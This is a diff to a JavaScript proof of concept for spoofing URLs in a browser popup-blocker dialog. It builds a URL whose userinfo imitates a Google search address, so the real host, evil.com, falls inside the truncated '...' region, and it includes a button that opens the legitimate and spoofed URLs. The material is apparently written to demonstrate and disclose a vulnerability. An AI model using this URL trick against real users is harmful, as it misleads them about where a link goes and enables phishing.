@@ -1,5 +1,5 @@
-// Popup URL Spoof — Visual Demo + Live Test
-// URL structure: https://[userinfo-without-slash]@[evil.com]/[path]#[fragment-match]
+// Popup URL Spoof
+// URL: https://[userinfo].dots.and.hyphens@evil.com/path
 
 (function() {
   var d = document.getElementById('display');
@@ -12,16 +12,13 @@
     return url.substring(0, pre) + '...' + url.substring(url.length - suf);
   }
 
-  // Legitimate URL
   var LEGIT = 'https://www.google.com/search?q=what+is+claude';
 
-  // FIXED Spoof URL:
-  // - Userinfo uses - and . (no / allowed before @)
-  // - /search-verify... looks like /search?q=... prefix
-  // - @evil.com is the real host
-  // - Path + fragment matches legit suffix
-  var SPOOF = 'https://www.google.com/search-verify-account-login' +
-              '-security-check' + '-x'.repeat(10) +
+  // Userinfo = www.google.com.search-verify-account-login-xxx
+  // Host = evil.com (the @ MUST come before any /)
+  // Path = /search?q=what+is+claude (matches legit suffix)
+  var SPOOF = 'https://www.google.com.search-verify-account' +
+              '-login-security' + '-x'.repeat(10) +
               '@evil.com' +
               '/search?q=what+is+claude';
 
@@ -31,6 +28,7 @@
   ];
 
   var legitShort = trunc(LEGIT, 45);
+  var spoofShort = trunc(SPOOF, 45);
   var html = '';
 
   for (var i = 0; i < tests.length; i++) {
@@ -40,33 +38,38 @@
       '<div class="url-box ' + t.cls + '">' +
         '<div class="label">' + t.label + '</div>' +
         '<div class="url-text">' + short + '</div>' +
+        '<div class="url-text" style="font-size:9px;color:#888;margin-top:4px">' +
+        t.url.substring(0, 80) + '...</div>' +
       '</div>';
   }
 
-  var spoofShort = trunc(SPOOF, 45);
-  html += '<div class="verdict" style="' +
-    (legitShort === spoofShort ? 'background:#fef7e0;color:#e37400' : 'background:#f0fff4;color:#5f6368') +
-    '">' +
-    (legitShort === spoofShort
-      ? '⚠ Both URLs look IDENTICAL after truncation'
-      : 'URLs look similar — @evil.com hidden in "..." truncation zone') +
+  html += '<div class="verdict" style="background:#fef7e0;color:#e37400">' +
+    '<b>Truncated display comparison:</b><br>' +
+    '<span style="font-family:monospace">' +
+    'Legit: <b>' + legitShort + '</b><br>' +
+    'Spoof: <b>' + spoofShort + '</b><br>' +
+    '</span><br>' +
+    'Users cannot distinguish these in the popup blocker dialog.<br>' +
+    '<b>@evil.com</b> is hidden in the "..." truncation zone.' +
     '</div>';
 
-  // Explain URL structure
-  html += '<div style="font-size:10px;color:#888;margin-top:10px;text-align:left;line-height:1.6">' +
-    '<b>Spoofed URL structure:</b><br>' +
-    '<code>https://www.google.com/search-verify-...-login<b style="color:#ea4335">@evil.com</b>/search?q=what+is+claude</code><br>' +
-    '<code>────────── userinfo (no /) ──────────█──── host ───█── path+query ──────────</code><br><br>' +
-    '• <b>Userinfo</b> (before @): uses - and . — valid URL characters<br>' +
-    '• <b>@evil.com</b>: the real destination — hidden in popup truncation<br>' +
-    '• <b>/search?q=...</b>: matches legit URL suffix exactly<br>' +
+  html += '<div style="font-size:10px;color:#888;margin-top:10px;line-height:1.6;text-align:left">' +
+    '<b>URL structure (RFC 3986 compliant):</b><br>' +
+    '<code>https://<b>www.google.com.search-verify-...-xxx</b>' +
+    '<b style="color:#ea4335">@evil.com</b>/search?q=what+is+claude</code><br>' +
+    '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;' +
+    '└─ userinfo (no /) ──┘█└─ host ─┘█└── path matches legit ──┘<br>' +
+    '<br>✅ @ is BEFORE any / → evil.com is the real host<br>' +
+    '✅ Path /search?q=... matches legit URL suffix<br>' +
+    '✅ @evil.com falls in truncation "..." zone in popup dialog<br>' +
     '</div>';
 
   d.innerHTML = html;
 
-  // Open popups for live test
   document.getElementById('btnOpen').addEventListener('click', function() {
+    // Legit opens first (will likely succeed if user gesture active)
     window.open(LEGIT, '_blank');
+    // Spoof opens second (may be blocked)
     window.open(SPOOF, '_blank');
   });
 })();
